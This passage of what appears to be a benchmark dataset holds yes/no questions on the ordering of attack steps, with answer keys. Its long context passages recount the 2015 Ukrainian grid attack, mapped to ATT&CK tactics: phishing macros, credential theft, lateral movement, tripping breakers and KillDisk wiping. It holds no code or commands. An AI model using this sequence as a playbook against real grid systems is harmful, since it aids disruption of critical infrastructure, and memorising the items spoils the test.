Credential Access: Step 7: Harvest Credentials. Delivered BE3 malware plugins conduct credential harvesting and network discovery functions. Delivered BlackEnergy 3 malware plugins conduct credential harvesting and network discovery functions. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Windows OS workstations, Windows domain controllers, virtual private network (VPN) service deployed in control environment Role in infrastructure: These systems support business operations, manage permissions and domain access, and provide remote network access respectively. Exploitation method: Adversaries use delivered BlackEnergy 3 plugins to gather stored credentials or log keystrokes. After gathering valid credentials for user with administrator privileges, adversaries use the stolen administrator credentials to access the domain controller, recover additional credentials, and create new privileged accounts. Impact: Adversaries obtain valid credentials enabling them to expand access across the corporate network and into the control environment, ensure persistent access, and blend into regular network traffic.
Discovery: Step 8: Lateral Movement and Target Identification on Corporate Network Adversaries conduct internal reconnaissance on corporate network to discover potential targets and expand accessed. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Discovered systems, including networked uninterruptable power supply (UPS) devices, data center servers, a telephone communications server, and employee workstations Role in infrastructure: Internal reconnaissance efforts could potentially include all deployed devices on the corporate network. Exploitation method: Adversaries likely use a combination of valid user credentials and BlackEnergy 3 plugins developed to conduct network discovery. VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish remote connections to workstations and servers. Impact: Adversaries can enumerate the systems deployed across the network, identify targets, and begin preparations for final attack. Step 9: Lateral Movement and Target Identification on ICS network Adversaries use stolen credentials to access the control environment and conduct reconnaissance on deployed systems. Location: ICS network Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Discovered systems, including human machine interface (HMI) workstations, distributed management system (DMS) servers, UPS devices, 52 serial-to-Ethernet converters (Moxa UC 7408-LX-Plus, 53 IRZRUH2 3G54), remote terminal unit (RTU) devices (ABB RTU560 CMU-02), and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. UPS devices condition incoming power to downstream devices and provide temporary battery backup power. Serial-to-Ethernet converters convert serial data from field devices to digital packets, enabling communications with the control center. RTU devices function as a communication processor or a data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to interact directly with the client application for the DMS server via a VPN, and native remote access services to access employee workstations hosting HMI applications. This access likely enables adversaries to enumerate all networked devices within the control environment. Impact: Adversaries gain access to critical systems, enabling them to begin target selection and preparations for final attack.
Command and Control: Step 5: Establish CC Connection. Malware establishes connection from the malicious implant on the targeted network to attacker-controlled CC server. Location: Corporate network Action: Malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: The external connection is established as part of the execution routine following installation of the malicious files. Once permissions to execute macros are granted by employees, the malicious VBA script installs the malware implant, and the implant attempts to communicate with an external server via HTTP requests. Impact: Adversaries gain unauthorized access to targeted networks, including the ability to deliver additional BlackEnergy plugins to enable internal network reconnaissance and credential harvesting.
Impact: Step 10: Develop Malicious Computer Code. Adversaries develop malicious computer code update for identified serial-to-Ethernet converters. Location: External infrastructure Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: After identifying deployed converts, adversaries begin a malware development and testing effort on infrastructure outside of the targeted network. Impact: Upon completion of this step, adversaries would have target-specific malware designed to disrupt communications with field devices by disabling deployed converters. Step 11: Deliver Data Destruction Malware. Adversaries likely deliver KillDisk malware to a network share and set policy on the domain controller to retrieve malware and execute upon system reboot. Location: Corporate and ICS network Action: Active threat actor activity Timeline: December 2015, directly preceding attack Device/application: Network share and Windows domain controller server Role in infrastructure: The network share provides access to shared digital resources, and the Windows domain controller manages access control throughout the network. Exploitation method: Adversaries likely use stolen credentials to place KillDisk malware on a network share, then set the retrieval and execution of the malicious files by implementing a policy on the compromised domain controller server. Impact: Prescheduling execution of malware enables coordination of multiple attack components, such that data destruction coincides with or shortly follows attacks against breakers. Step 12: Schedule Uninterruptable Power Supply (UPS) Disruption. Adversaries schedule unauthorized outage of UPS for telephone communication server and data center servers. Location: Corporate and ICS network Action: Active threat actor activity Timeline: Directly preceding December 2015 attack Device/application: Networked UPS devices with remote management interface Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries likely use valid credentials to access privileged employee accounts, then use this access to remotely schedule unauthorized power outages. Impact: Prescheduling outages enables coordination of multiple attack components, such that critical systems also go down because of the power outages, stifling potential restoration efforts. Step 13: Trip Breakers. Adversaries use native remote access services and valid credentials to open breakers and disrupt power distribution to over 225,000 customers within three distribution areas. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during Device/application: HMI workstations, DMS servers, RTU, and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to seize control of operator workstations, access DMS client application via VPN, and issue unauthorized commands to breakers at substations. Impact: Opening of breakers results in disruption of electricity service to customers. Step 14: Sever Connection to Field Devices. After opening the breakers, adversaries deliver malicious computer code update to serial-to-Ethernet communications devices. The malicious updates render the converters inoperable, and sever connections between the control center and the substations. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during attack Device/application: Serial-to-Ethernet converters (Moxa UC 7408-LX-Plus,55 IRZRUH2 3G56) Role in infrastructure: Convert serial data from field devices to digital packets to be transmitted to remote monitoring and administration systems within the control network. Exploitation method: Adversaries use network access to push the malicious update over the network to targeted devices. Impact: Operators are unable to remotely close the breakers, requiring workers to manually close breakers at each substation. Forcing this manual response draws out recovery time Step 15: Telephony Denial-of-Service Attack. Adversaries initiate DoS attack on telephone call center at one of the targeted distributors. Location: Corporate network Action: Likely automated process Timeline: Dec 23, 2015, during attack Device/application: Operator telephone call center Role in infrastructure: Receive external telephone communications from customers. Exploitation method: Adversaries likely use automated IP-based call generators to flood the targeted call center. Impact: Automated calls overwhelm resources at call center, blocking legitimate communications from customers. Step 16: Disable Critical Systems via UPS Outage. Previously scheduled UPS outage cuts power to targeted telephone communications server and data center servers. Location: Corporate and ICS network Action: Execution of prescheduled process Timeline: December 23, 2015, during attack Device/application: Networked UPS devices with remote management interface, telephone communications server, and data center servers Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries use network access to schedule the temporary backup power to be offline at the time of the power outages. Impact: Power loss to telephone server disrupts communications across remote sites, and disruptions at control centers inhibit ability to monitor and respond to attack against breakers. The disruption at the data center and associated system reboot trigger execution of KillDisk malware. Step 17: Destroy Critical System Data. Scheduled execution of KillDisk malware erases the master boot records and deletes system log data on targeted machines across the victims' corporate and ICS network. Location: Corporate network and ICS network Action: Malware execution Timeline: December 23, 2015, during attack Device/application: RTU device (ABB RTU560 CMU-02),57 servers and workstations used by management, human resources (HR), and finance staff Role in infrastructure: The RTU functions as a communication processor or data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center.58 Servers and workstations are used by management, HR, and finance staff to conduct business administration operations. Exploitation method: Malware is retrieved from the network share and executed on networked devices according to direction received via domain controller policy or local Windows Task Scheduler. Impact: Targeted systems are rendered inoperable, and critical data is destroyed.",Yes,intelligence-games-in-the-power-grid-2016
2009,351,351-Command and Control-T1071-Application Layer Protocol,"After adversaries conduct initial access by delivering phishing emails with weaponized MS Office attachments and employees enable macros to install BlackEnergy 3 malware, is it likely that the malware will establish a connection from the malicious implant to an attacker-controlled command and control (C2) server before enabling internal network reconnaissance and credential harvesting?","Command and Control: Step 5: Establish CC Connection. Malware establishes connection from the malicious implant on the targeted network to attacker-controlled CC server. Location: Corporate network Action: Malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: The external connection is established as part of the execution routine following installation of the malicious files. Once permissions to execute macros are granted by employees, the malicious VBA script installs the malware implant, and the implant attempts to communicate with an external server via HTTP requests. Impact: Adversaries gain unauthorized access to targeted networks, including the ability to deliver additional BlackEnergy plugins to enable internal network reconnaissance and credential harvesting.","Reconnaissance: Step 1: Reconnaissance and Intelligence Gathering. Before the attack, adversaries likely begin open-source intelligence gathering and reconnaissance on potential targets. Location: External infrastructure Action: Active threat actor activity Timeline: May 2014 or earlier Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: Adversaries likely gather publicly available information on deployed systems and network architecture, and may also use active discovery methods such as scanning of perimeter devices, enumeration of devices, social media data collection and analysis for future targeting
Initial Access: Step 3: Deliver Remote Access Trojan (RAT) Adversaries initiate phishing campaign against electricity distributors. Step 4: Install RAT. Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Active threat actor activity Timeline: May 2014-June 2015e Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other IT services used in business operations. Exploitation method: Adversaries send targeted emails containing the modified MS Office files as attachments to users on targeted networks. Impact: RAT is delivered to targeted network, but not installed. Installation requires employees to actively grant permission to the embedded VBA scripts to execute.
Execution: Step 4: Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Employee-enabled malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: In a social engineering attack, employees are prompted to enable macros when opening the file attached to phishing email. Once macros are enabled, the VBA script places multiple malicious files on the workstation, unbeknown to the employee. Impact: Files placed on workstations within the corporate network can begin the communication process with external Command and Control (CC) servers.
Credential Access: Step 7: Harvest Credentials. Delivered BE3 malware plugins conduct credential harvesting and network discovery functions. Delivered BlackEnergy 3 malware plugins conduct credential harvesting and network discovery functions. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Windows OS workstations, Windows domain controllers, virtual private network (VPN) service deployed in control environment Role in infrastructure: These systems support business operations, manage permissions and domain access, and provide remote network access respectively. Exploitation method: Adversaries use delivered BlackEnergy 3 plugins to gather stored credentials or log keystrokes. After gathering valid credentials for user with administrator privileges, adversaries use the stolen administrator credentials to access the domain controller, recover additional credentials, and create new privileged accounts. Impact: Adversaries obtain valid credentials enabling them to expand access across the corporate network and into the control environment, ensure persistent access, and blend into regular network traffic.
Discovery: Step 8: Lateral Movement and Target Identification on Corporate Network Adversaries conduct internal reconnaissance on corporate network to discover potential targets and expand accessed. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Discovered systems, including networked uninterruptable power supply (UPS) devices, data center servers, a telephone communications server, and employee workstations Role in infrastructure: Internal reconnaissance efforts could potentially include all deployed devices on the corporate network. Exploitation method: Adversaries likely use a combination of valid user credentials and BlackEnergy 3 plugins developed to conduct network discovery. VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish remote connections to workstations and servers. Impact: Adversaries can enumerate the systems deployed across the network, identify targets, and begin preparations for final attack. Step 9: Lateral Movement and Target Identification on ICS network Adversaries use stolen credentials to access the control environment and conduct reconnaissance on deployed systems. Location: ICS network Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Discovered systems, including human machine interface (HMI) workstations, distributed management system (DMS) servers, UPS devices, 52 serial-to-Ethernet converters (Moxa UC 7408-LX-Plus, 53 IRZRUH2 3G54), remote terminal unit (RTU) devices (ABB RTU560 CMU-02), and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. UPS devices condition incoming power to downstream devices and provide temporary battery backup power. Serial-to-Ethernet converters convert serial data from field devices to digital packets, enabling communications with the control center. RTU devices function as a communication processor or a data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to interact directly with the client application for the DMS server via a VPN, and native remote access services to access employee workstations hosting HMI applications. This access likely enables adversaries to enumerate all networked devices within the control environment. Impact: Adversaries gain access to critical systems, enabling them to begin target selection and preparations for final attack.
Impact: Step 10: Develop Malicious Computer Code. Adversaries develop malicious computer code update for identified serial-to-Ethernet converters. Location: External infrastructure Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: After identifying deployed converts, adversaries begin a malware development and testing effort on infrastructure outside of the targeted network. Impact: Upon completion of this step, adversaries would have target-specific malware designed to disrupt communications with field devices by disabling deployed converters. Step 11: Deliver Data Destruction Malware. Adversaries likely deliver KillDisk malware to a network share and set policy on the domain controller to retrieve malware and execute upon system reboot. Location: Corporate and ICS network Action: Active threat actor activity Timeline: December 2015, directly preceding attack Device/application: Network share and Windows domain controller server Role in infrastructure: The network share provides access to shared digital resources, and the Windows domain controller manages access control throughout the network. Exploitation method: Adversaries likely use stolen credentials to place KillDisk malware on a network share, then set the retrieval and execution of the malicious files by implementing a policy on the compromised domain controller server. Impact: Prescheduling execution of malware enables coordination of multiple attack components, such that data destruction coincides with or shortly follows attacks against breakers. Step 12: Schedule Uninterruptable Power Supply (UPS) Disruption. Adversaries schedule unauthorized outage of UPS for telephone communication server and data center servers. Location: Corporate and ICS network Action: Active threat actor activity Timeline: Directly preceding December 2015 attack Device/application: Networked UPS devices with remote management interface Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries likely use valid credentials to access privileged employee accounts, then use this access to remotely schedule unauthorized power outages. Impact: Prescheduling outages enables coordination of multiple attack components, such that critical systems also go down because of the power outages, stifling potential restoration efforts. Step 13: Trip Breakers. Adversaries use native remote access services and valid credentials to open breakers and disrupt power distribution to over 225,000 customers within three distribution areas. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during Device/application: HMI workstations, DMS servers, RTU, and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to seize control of operator workstations, access DMS client application via VPN, and issue unauthorized commands to breakers at substations. Impact: Opening of breakers results in disruption of electricity service to customers. Step 14: Sever Connection to Field Devices. After opening the breakers, adversaries deliver malicious computer code update to serial-to-Ethernet communications devices. The malicious updates render the converters inoperable, and sever connections between the control center and the substations. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during attack Device/application: Serial-to-Ethernet converters (Moxa UC 7408-LX-Plus,55 IRZRUH2 3G56) Role in infrastructure: Convert serial data from field devices to digital packets to be transmitted to remote monitoring and administration systems within the control network. Exploitation method: Adversaries use network access to push the malicious update over the network to targeted devices. Impact: Operators are unable to remotely close the breakers, requiring workers to manually close breakers at each substation. Forcing this manual response draws out recovery time Step 15: Telephony Denial-of-Service Attack. Adversaries initiate DoS attack on telephone call center at one of the targeted distributors. Location: Corporate network Action: Likely automated process Timeline: Dec 23, 2015, during attack Device/application: Operator telephone call center Role in infrastructure: Receive external telephone communications from customers. Exploitation method: Adversaries likely use automated IP-based call generators to flood the targeted call center. Impact: Automated calls overwhelm resources at call center, blocking legitimate communications from customers. Step 16: Disable Critical Systems via UPS Outage. Previously scheduled UPS outage cuts power to targeted telephone communications server and data center servers. Location: Corporate and ICS network Action: Execution of prescheduled process Timeline: December 23, 2015, during attack Device/application: Networked UPS devices with remote management interface, telephone communications server, and data center servers Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries use network access to schedule the temporary backup power to be offline at the time of the power outages. Impact: Power loss to telephone server disrupts communications across remote sites, and disruptions at control centers inhibit ability to monitor and respond to attack against breakers. The disruption at the data center and associated system reboot trigger execution of KillDisk malware. Step 17: Destroy Critical System Data. Scheduled execution of KillDisk malware erases the master boot records and deletes system log data on targeted machines across the victims' corporate and ICS network. Location: Corporate network and ICS network Action: Malware execution Timeline: December 23, 2015, during attack Device/application: RTU device (ABB RTU560 CMU-02),57 servers and workstations used by management, human resources (HR), and finance staff Role in infrastructure: The RTU functions as a communication processor or data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center.58 Servers and workstations are used by management, HR, and finance staff to conduct business administration operations. Exploitation method: Malware is retrieved from the network share and executed on networked devices according to direction received via domain controller policy or local Windows Task Scheduler. Impact: Targeted systems are rendered inoperable, and critical data is destroyed.",Yes,intelligence-games-in-the-power-grid-2016
2010,351,351-Reconnaissance-T1595-Active Scanning,"After using active discovery methods for reconnaissance and intelligence gathering to identify potential targets, is it likely that the adversaries will initiate a phishing campaign against electricity distributors before establishing a command and control connection through malware on the targeted network?","Reconnaissance: Step 1: Reconnaissance and Intelligence Gathering. Before the attack, adversaries likely begin open-source intelligence gathering and reconnaissance on potential targets. Location: External infrastructure Action: Active threat actor activity Timeline: May 2014 or earlier Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: Adversaries likely gather publicly available information on deployed systems and network architecture, and may also use active discovery methods such as scanning of perimeter devices, enumeration of devices, social media data collection and analysis for future targeting","Initial Access: Step 3: Deliver Remote Access Trojan (RAT) Adversaries initiate phishing campaign against electricity distributors. Step 4: Install RAT. Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Active threat actor activity Timeline: May 2014-June 2015e Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other IT services used in business operations. Exploitation method: Adversaries send targeted emails containing the modified MS Office files as attachments to users on targeted networks. Impact: RAT is delivered to targeted network, but not installed. Installation requires employees to actively grant permission to the embedded VBA scripts to execute.
Execution: Step 4: Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Employee-enabled malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: In a social engineering attack, employees are prompted to enable macros when opening the file attached to phishing email. Once macros are enabled, the VBA script places multiple malicious files on the workstation, unbeknown to the employee. Impact: Files placed on workstations within the corporate network can begin the communication process with external Command and Control (CC) servers.
Credential Access: Step 7: Harvest Credentials. Delivered BE3 malware plugins conduct credential harvesting and network discovery functions. Delivered BlackEnergy 3 malware plugins conduct credential harvesting and network discovery functions. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Windows OS workstations, Windows domain controllers, virtual private network (VPN) service deployed in control environment Role in infrastructure: These systems support business operations, manage permissions and domain access, and provide remote network access respectively. Exploitation method: Adversaries use delivered BlackEnergy 3 plugins to gather stored credentials or log keystrokes. After gathering valid credentials for user with administrator privileges, adversaries use the stolen administrator credentials to access the domain controller, recover additional credentials, and create new privileged accounts. Impact: Adversaries obtain valid credentials enabling them to expand access across the corporate network and into the control environment, ensure persistent access, and blend into regular network traffic.
Discovery: Step 8: Lateral Movement and Target Identification on Corporate Network Adversaries conduct internal reconnaissance on corporate network to discover potential targets and expand accessed. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Discovered systems, including networked uninterruptable power supply (UPS) devices, data center servers, a telephone communications server, and employee workstations Role in infrastructure: Internal reconnaissance efforts could potentially include all deployed devices on the corporate network. Exploitation method: Adversaries likely use a combination of valid user credentials and BlackEnergy 3 plugins developed to conduct network discovery. VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish remote connections to workstations and servers. Impact: Adversaries can enumerate the systems deployed across the network, identify targets, and begin preparations for final attack. Step 9: Lateral Movement and Target Identification on ICS network Adversaries use stolen credentials to access the control environment and conduct reconnaissance on deployed systems. Location: ICS network Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Discovered systems, including human machine interface (HMI) workstations, distributed management system (DMS) servers, UPS devices, 52 serial-to-Ethernet converters (Moxa UC 7408-LX-Plus, 53 IRZRUH2 3G54), remote terminal unit (RTU) devices (ABB RTU560 CMU-02), and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. UPS devices condition incoming power to downstream devices and provide temporary battery backup power. Serial-to-Ethernet converters convert serial data from field devices to digital packets, enabling communications with the control center. RTU devices function as a communication processor or a data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to interact directly with the client application for the DMS server via a VPN, and native remote access services to access employee workstations hosting HMI applications. This access likely enables adversaries to enumerate all networked devices within the control environment. Impact: Adversaries gain access to critical systems, enabling them to begin target selection and preparations for final attack.
Command and Control: Step 5: Establish CC Connection. Malware establishes connection from the malicious implant on the targeted network to attacker-controlled CC server. Location: Corporate network Action: Malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: The external connection is established as part of the execution routine following installation of the malicious files. Once permissions to execute macros are granted by employees, the malicious VBA script installs the malware implant, and the implant attempts to communicate with an external server via HTTP requests. Impact: Adversaries gain unauthorized access to targeted networks, including the ability to deliver additional BlackEnergy plugins to enable internal network reconnaissance and credential harvesting.
Impact: Step 10: Develop Malicious Computer Code. Adversaries develop malicious computer code update for identified serial-to-Ethernet converters. Location: External infrastructure Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: After identifying deployed converts, adversaries begin a malware development and testing effort on infrastructure outside of the targeted network. Impact: Upon completion of this step, adversaries would have target-specific malware designed to disrupt communications with field devices by disabling deployed converters. Step 11: Deliver Data Destruction Malware. Adversaries likely deliver KillDisk malware to a network share and set policy on the domain controller to retrieve malware and execute upon system reboot. Location: Corporate and ICS network Action: Active threat actor activity Timeline: December 2015, directly preceding attack Device/application: Network share and Windows domain controller server Role in infrastructure: The network share provides access to shared digital resources, and the Windows domain controller manages access control throughout the network. Exploitation method: Adversaries likely use stolen credentials to place KillDisk malware on a network share, then set the retrieval and execution of the malicious files by implementing a policy on the compromised domain controller server. Impact: Prescheduling execution of malware enables coordination of multiple attack components, such that data destruction coincides with or shortly follows attacks against breakers. Step 12: Schedule Uninterruptable Power Supply (UPS) Disruption. Adversaries schedule unauthorized outage of UPS for telephone communication server and data center servers. Location: Corporate and ICS network Action: Active threat actor activity Timeline: Directly preceding December 2015 attack Device/application: Networked UPS devices with remote management interface Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries likely use valid credentials to access privileged employee accounts, then use this access to remotely schedule unauthorized power outages. Impact: Prescheduling outages enables coordination of multiple attack components, such that critical systems also go down because of the power outages, stifling potential restoration efforts. Step 13: Trip Breakers. Adversaries use native remote access services and valid credentials to open breakers and disrupt power distribution to over 225,000 customers within three distribution areas. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during Device/application: HMI workstations, DMS servers, RTU, and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to seize control of operator workstations, access DMS client application via VPN, and issue unauthorized commands to breakers at substations. Impact: Opening of breakers results in disruption of electricity service to customers. Step 14: Sever Connection to Field Devices. After opening the breakers, adversaries deliver malicious computer code update to serial-to-Ethernet communications devices. The malicious updates render the converters inoperable, and sever connections between the control center and the substations. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during attack Device/application: Serial-to-Ethernet converters (Moxa UC 7408-LX-Plus,55 IRZRUH2 3G56) Role in infrastructure: Convert serial data from field devices to digital packets to be transmitted to remote monitoring and administration systems within the control network. Exploitation method: Adversaries use network access to push the malicious update over the network to targeted devices. Impact: Operators are unable to remotely close the breakers, requiring workers to manually close breakers at each substation. Forcing this manual response draws out recovery time Step 15: Telephony Denial-of-Service Attack. Adversaries initiate DoS attack on telephone call center at one of the targeted distributors. Location: Corporate network Action: Likely automated process Timeline: Dec 23, 2015, during attack Device/application: Operator telephone call center Role in infrastructure: Receive external telephone communications from customers. Exploitation method: Adversaries likely use automated IP-based call generators to flood the targeted call center. Impact: Automated calls overwhelm resources at call center, blocking legitimate communications from customers. Step 16: Disable Critical Systems via UPS Outage. Previously scheduled UPS outage cuts power to targeted telephone communications server and data center servers. Location: Corporate and ICS network Action: Execution of prescheduled process Timeline: December 23, 2015, during attack Device/application: Networked UPS devices with remote management interface, telephone communications server, and data center servers Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries use network access to schedule the temporary backup power to be offline at the time of the power outages. Impact: Power loss to telephone server disrupts communications across remote sites, and disruptions at control centers inhibit ability to monitor and respond to attack against breakers. The disruption at the data center and associated system reboot trigger execution of KillDisk malware. Step 17: Destroy Critical System Data. Scheduled execution of KillDisk malware erases the master boot records and deletes system log data on targeted machines across the victims' corporate and ICS network. Location: Corporate network and ICS network Action: Malware execution Timeline: December 23, 2015, during attack Device/application: RTU device (ABB RTU560 CMU-02),57 servers and workstations used by management, human resources (HR), and finance staff Role in infrastructure: The RTU functions as a communication processor or data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center.58 Servers and workstations are used by management, HR, and finance staff to conduct business administration operations. Exploitation method: Malware is retrieved from the network share and executed on networked devices according to direction received via domain controller policy or local Windows Task Scheduler. Impact: Targeted systems are rendered inoperable, and critical data is destroyed.",Yes,intelligence-games-in-the-power-grid-2016
2011,351,351-Discovery-T1018-Remote System Discovery,"After credential harvesting using delivered BlackEnergy 3 plugins for expanding access across the corporate network, is it likely that adversaries will use valid credentials and BlackEnergy 3 plugins to conduct internal reconnaissance and access the control environment before developing a malicious computer code update for identified serial-to-Ethernet converters?","Discovery: Step 8: Lateral Movement and Target Identification on Corporate Network Adversaries conduct internal reconnaissance on corporate network to discover potential targets and expand accessed. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Discovered systems, including networked uninterruptable power supply (UPS) devices, data center servers, a telephone communications server, and employee workstations Role in infrastructure: Internal reconnaissance efforts could potentially include all deployed devices on the corporate network. Exploitation method: Adversaries likely use a combination of valid user credentials and BlackEnergy 3 plugins developed to conduct network discovery. VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish remote connections to workstations and servers. Impact: Adversaries can enumerate the systems deployed across the network, identify targets, and begin preparations for final attack. Step 9: Lateral Movement and Target Identification on ICS network Adversaries use stolen credentials to access the control environment and conduct reconnaissance on deployed systems. Location: ICS network Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Discovered systems, including human machine interface (HMI) workstations, distributed management system (DMS) servers, UPS devices, 52 serial-to-Ethernet converters (Moxa UC 7408-LX-Plus, 53 IRZRUH2 3G54), remote terminal unit (RTU) devices (ABB RTU560 CMU-02), and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. UPS devices condition incoming power to downstream devices and provide temporary battery backup power. Serial-to-Ethernet converters convert serial data from field devices to digital packets, enabling communications with the control center. RTU devices function as a communication processor or a data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to interact directly with the client application for the DMS server via a VPN, and native remote access services to access employee workstations hosting HMI applications. This access likely enables adversaries to enumerate all networked devices within the control environment. Impact: Adversaries gain access to critical systems, enabling them to begin target selection and preparations for final attack.","Reconnaissance: Step 1: Reconnaissance and Intelligence Gathering. Before the attack, adversaries likely begin open-source intelligence gathering and reconnaissance on potential targets. Location: External infrastructure Action: Active threat actor activity Timeline: May 2014 or earlier Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: Adversaries likely gather publicly available information on deployed systems and network architecture, and may also use active discovery methods such as scanning of perimeter devices, enumeration of devices, social media data collection and analysis for future targeting
Initial Access: Step 3: Deliver Remote Access Trojan (RAT) Adversaries initiate phishing campaign against electricity distributors. Step 4: Install RAT. Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Active threat actor activity Timeline: May 2014-June 2015e Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other IT services used in business operations. Exploitation method: Adversaries send targeted emails containing the modified MS Office files as attachments to users on targeted networks. Impact: RAT is delivered to targeted network, but not installed. Installation requires employees to actively grant permission to the embedded VBA scripts to execute.
Execution: Step 4: Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Employee-enabled malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: In a social engineering attack, employees are prompted to enable macros when opening the file attached to phishing email. Once macros are enabled, the VBA script places multiple malicious files on the workstation, unbeknown to the employee. Impact: Files placed on workstations within the corporate network can begin the communication process with external Command and Control (CC) servers.
